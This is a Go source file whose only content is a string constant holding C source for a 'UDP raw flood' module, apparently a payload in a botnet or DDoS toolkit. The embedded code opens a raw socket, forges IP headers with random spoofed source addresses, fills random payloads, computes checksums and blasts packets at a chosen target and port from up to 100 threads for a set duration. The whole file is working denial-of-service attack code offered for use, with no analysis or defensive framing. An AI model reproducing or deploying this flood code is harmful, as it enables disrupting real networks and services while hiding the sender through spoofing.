package payloads

var UDPRaw = `
// ==================== UDP RAW FLOOD MODULE ====================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

static int udp_raw_running = 0;
static pthread_t udp_raw_threads[100];

unsigned short csum_raw(unsigned short *buf, int count) {
    register unsigned long sum = 0;
    while (count > 1) { sum += *buf++; count -= 2; }
    if (count > 0) sum += *(unsigned char *)buf;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (unsigned short)(~sum);
}

unsigned short udpcsum_raw(struct iphdr *iph, struct udphdr *udph, int psize) {
    struct udp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_UDP;
    pseudohead.length = htons(sizeof(struct udphdr) + psize);
    int totaludp_len = sizeof(struct udp_pseudo) + sizeof(struct udphdr) + psize;
    unsigned short *udp = malloc(totaludp_len);
    memcpy((unsigned char *)udp, &pseudohead, sizeof(struct udp_pseudo));
    memcpy((unsigned char *)udp + sizeof(struct udp_pseudo), (unsigned char *)udph, sizeof(struct udphdr) + psize);
    unsigned short output = csum_raw(udp, totaludp_len);
    free(udp);
    return output;
}

void *udp_raw_flood(void *arg) {
    char *target_ip = (char *)arg;
    int port = *(int *)((char *)arg + 64);
    int duration = *(int *)((char *)arg + 68);
    int length = *(int *)((char *)arg + 72);
    
    char datagram[1510];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (struct udphdr *)(iph + 1);
    char *data = (char *)(udph + 1);
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(target_ip);
    
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (s < 0) return NULL;
    
    int tmp = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp));
    
    memset(datagram, 0, 1510);
    
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + length);
    iph->id = htons(rand() & 0xFFFF);
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = rand();
    iph->daddr = sin.sin_addr.s_addr;
    
    udph->source = htons(rand() & 0xFFFF);
    udph->dest = htons(port);
    udph->len = htons(sizeof(struct udphdr) + length);
    udph->check = 0;
    
    for (int i = 0; i < length; i++) data[i] = rand() % 256;
    
    time_t start = time(NULL);
    
    while (udp_raw_running && time(NULL) - start < duration) {
        iph->saddr = rand();
        iph->id = htons(rand() & 0xFFFF);
        iph->check = 0;
        iph->check = csum_raw((unsigned short *)iph, sizeof(struct iphdr));
        
        udph->source = htons(rand() & 0xFFFF);
        udph->check = 0;
        udph->check = udpcsum_raw(iph, udph, length);
        
        sendto(s, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
    }
    
    close(s);
    return NULL;
}

void start_udp_raw_attack(char *target, int port, int threads, int duration_sec, int length) {
    if (udp_raw_running) return;
    udp_raw_running = 1;
    
    char *arg = malloc(128);
    strcpy(arg, target);
    *((int *)(arg + 64)) = port;
    *((int *)(arg + 68)) = duration_sec;
    *((int *)(arg + 72)) = length;
    
    for (int i = 0; i < threads; i++) {
        pthread_create(&udp_raw_threads[i], NULL, udp_raw_flood, arg);
    }
    
    sleep(duration_sec);
    udp_raw_running = 0;
    for (int i = 0; i < threads; i++) {
        pthread_join(udp_raw_threads[i], NULL);
    }
    free(arg);
}

void stop_udp_raw_attack() { udp_raw_running = 0; }
// ==================== END UDP RAW MODULE ====================
`